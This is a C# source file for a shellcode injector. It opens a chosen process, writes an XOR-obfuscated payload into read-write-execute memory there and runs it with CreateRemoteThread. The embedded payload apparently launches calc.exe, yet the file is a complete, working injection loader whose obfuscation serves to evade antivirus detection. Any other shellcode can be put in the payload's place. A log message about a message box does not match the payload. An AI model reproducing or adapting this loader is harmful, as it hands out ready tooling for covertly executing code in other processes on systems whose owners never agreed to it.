using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Text;
using System.Formats.Asn1;
using System.Runtime.ExceptionServices;
using System.Net.NetworkInformation;

namespace ShellcodeInjection
{
    class Program
    {
        static void error(string functionName)
        {
            Console.WriteLine($"[-] {functionName} Failed With Error : {Marshal.GetLastWin32Error()}");
        }

        static void log(string logText)
        {
            Console.WriteLine($"[+] {logText}");
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto)]
        static extern bool Process32First([In] IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Unicode)]
        static extern bool Process32Next([In] IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle([In] IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
           IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
           IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        private enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }
        //inner struct used only internally
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct PROCESSENTRY32
        {
            const int MAX_PATH = 260;
            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ProcessID;
            internal IntPtr th32DefaultHeapID;
            internal UInt32 th32ModuleID;
            internal UInt32 cntThreads;
            internal UInt32 th32ParentProcessID;
            internal Int32 pcPriClassBase;
            internal UInt32 dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
            internal string szExeFile;
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public static bool GetProcessHandle(string ProcessId, out IntPtr hProcess, out UInt32 dwProcessId)
        {
            hProcess = IntPtr.Zero;
            dwProcessId = 0;
            IntPtr hSnap = IntPtr.Zero;
            PROCESSENTRY32 pe32 = new PROCESSENTRY32();
            pe32.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));

            hSnap = CreateToolhelp32Snapshot(0x00000002, 0);
            log("Took snapshot");

            if (!Process32First(hSnap, ref pe32))
            {
                error("Process32First");
                CloseHandle(hSnap);
                return false;
            }
            log("Checked first process");

            do
            {
                if (int.Parse(ProcessId) == pe32.th32ProcessID)
                {
                    dwProcessId = pe32.th32ProcessID;
                    hProcess = OpenProcess(0x1F0FFF, false, pe32.th32ProcessID);

                    if (hProcess == IntPtr.Zero)
                    {
                        error("OpenProcess");
                        CloseHandle(hSnap);
                        hProcess = IntPtr.Zero;
                        dwProcessId = 0;
                        return false;
                    }
                    break;
                }

            } while (Process32Next(hSnap, ref pe32));

            if (hSnap != IntPtr.Zero)
            {
                CloseHandle(hSnap);
            }

            if (hProcess == IntPtr.Zero || dwProcessId == 0)
            {
                return false;
            }

            return true;
        }

        static bool RemoteInjection(byte[] pPayload, UInt32 sSize, IntPtr hProcess)
        {
            IntPtr lpNumofBytes = IntPtr.Zero;
            IntPtr lpThreadid = IntPtr.Zero;

            IntPtr pShellcode = VirtualAllocEx(hProcess, IntPtr.Zero, sSize, 
                (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve, 
                (UInt32)MemoryProtection.ExecuteReadWrite);
            if (pShellcode == IntPtr.Zero)
            {
                error("VirtualAllocEx");
                CloseHandle(hProcess);
                return false;
            }

            log("Allocated space");

            if (!WriteProcessMemory(hProcess, pShellcode, pPayload, (int)sSize, out lpNumofBytes))
            {
                error("WriteProcessMemory");
                CloseHandle(hProcess);
                return false;
            }
            log("Wrote payload");

            IntPtr hInject = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pShellcode, IntPtr.Zero, 0, out lpThreadid);
            if (hInject == IntPtr.Zero)
            {
                error("CreateRemoteThread");
                CloseHandle(hProcess);
                return false;
            }
            WaitForSingleObject(hInject, 0xFFFFF);
            log("Thread executed");
            CloseHandle(hProcess);
            return true;
        }

        public static void Main(string[] args) 
        {
            IntPtr hProcess = IntPtr.Zero;
            UInt32 dwProcessId = 0;

            if (args.Length < 1)
            {
                log("Usage: .\\Inject.exe <PID of process to inject to>");
                return;
            }

            byte[] ObfuscatedPayload = new byte[276] {
            0x85, 0x31, 0xfa, 0x9d, 0x89, 0x91, 0xb9, 0x79, 0x79, 0x79, 0x38, 0x28, 0x38, 0x29, 0x2b, 0x28, 0x2f, 0x31, 0x48, 0xab, 0x1c, 0x31, 0xf2, 0x2b, 0x19, 0x31, 0xf2, 0x2b, 0x61, 0x31, 0xf2, 0x2b, 0x59, 0x31, 0xf2, 0x0b, 0x29, 0x31, 0x76, 0xce, 0x33, 0x33, 0x34, 0x48, 0xb0, 0x31, 0x48, 0xb9, 0xd5, 0x45, 0x18, 0x05, 0x7b, 0x55, 0x59, 0x38, 0xb8, 0xb0, 0x74, 0x38, 0x78, 0xb8, 0x9b, 0x94, 0x2b, 0x38, 0x28, 0x31, 0xf2, 0x2b, 0x59, 0xf2, 0x3b, 0x45, 0x31, 0x78, 0xa9, 0xf2, 0xf9, 0xf1, 0x79, 0x79, 0x79, 0x31, 0xfc, 0xb9, 0x0d, 0x1e, 0x31, 0x78, 0xa9, 0x29, 0xf2, 0x31, 0x61, 0x3d, 0xf2, 0x39, 0x59, 0x30, 0x78, 0xa9, 0x9a, 0x2f, 0x31, 0x86, 0xb0, 0x38, 0xf2, 0x4d, 0xf1, 0x31, 0x78, 0xaf, 0x34, 0x48, 0xb0, 0x31, 0x48, 0xb9, 0xd5, 0x38, 0xb8, 0xb0, 0x74, 0x38, 0x78, 0xb8, 0x41, 0x99, 0x0c, 0x88, 0x35, 0x7a, 0x35, 0x5d, 0x71, 0x3c, 0x40, 0xa8, 0x0c, 0xa1, 0x21, 0x3d, 0xf2, 0x39, 0x5d, 0x30, 0x78, 0xa9, 0x1f, 0x38, 0xf2, 0x75, 0x31, 0x3d, 0xf2, 0x39, 0x65, 0x30, 0x78, 0xa9, 0x38, 0xf2, 0x7d, 0xf1, 0x31, 0x78, 0xa9, 0x38, 0x21, 0x38, 0x21, 0x27, 0x20, 0x23, 0x38, 0x21, 0x38, 0x20, 0x38, 0x23, 0x31, 0xfa, 0x95, 0x59, 0x38, 0x2b, 0x86, 0x99, 0x21, 0x38, 0x20, 0x23, 0x31, 0xf2, 0x6b, 0x90, 0x2e, 0x86, 0x86, 0x86, 0x24, 0x31, 0xc3, 0x78, 0x79, 0x79, 0x79, 0x79, 0x79, 0x79, 0x79, 0x31, 0xf4, 0xf4, 0x78, 0x78, 0x79, 0x79, 0x38, 0xc3, 0x48, 0xf2, 0x16, 0xfe, 0x86, 0xac, 0xc2, 0x89, 0xcc, 0xdb, 0x2f, 0x38, 0xc3, 0xdf, 0xec, 0xc4, 0xe4, 0x86, 0xac, 0x31, 0xfa, 0xbd, 0x51, 0x45, 0x7f, 0x05, 0x73, 0xf9, 0x82, 0x99, 0x0c, 0x7c, 0xc2, 0x3e, 0x6a, 0x0b, 0x16, 0x13, 0x79, 0x20, 0x38, 0xf0, 0xa3, 0x86, 0xac, 0x1a, 0x18, 0x15, 0x1a, 0x57, 0x1c, 0x01, 0x1c, 0x79
            };

            int sSize = ObfuscatedPayload.Length;
            byte xorKey = 0x79;
            byte[] DeobfuscatedPayload = new byte[sSize];

            for (int i = 0; i < sSize; i++)
            {
                DeobfuscatedPayload[i] = (byte)(ObfuscatedPayload[i] ^ xorKey);
            }
            log("Deobfuscated shellcode");

            log("Getting handle to process...");
            if (!GetProcessHandle(args[0], out hProcess, out dwProcessId))
            {
                Console.WriteLine("[-] Could not find process");
                CloseHandle(hProcess);
                return;
            }
            log("Found process handle");

            if (!RemoteInjection(DeobfuscatedPayload, (UInt32)sSize, hProcess))
            {
                Console.WriteLine("[-] Could not inject DLL");
                CloseHandle(hProcess);
                return;
            }
            log("Message box should appear");

            CloseHandle(hProcess);
            log("Closed handle");

            


        }

    }
}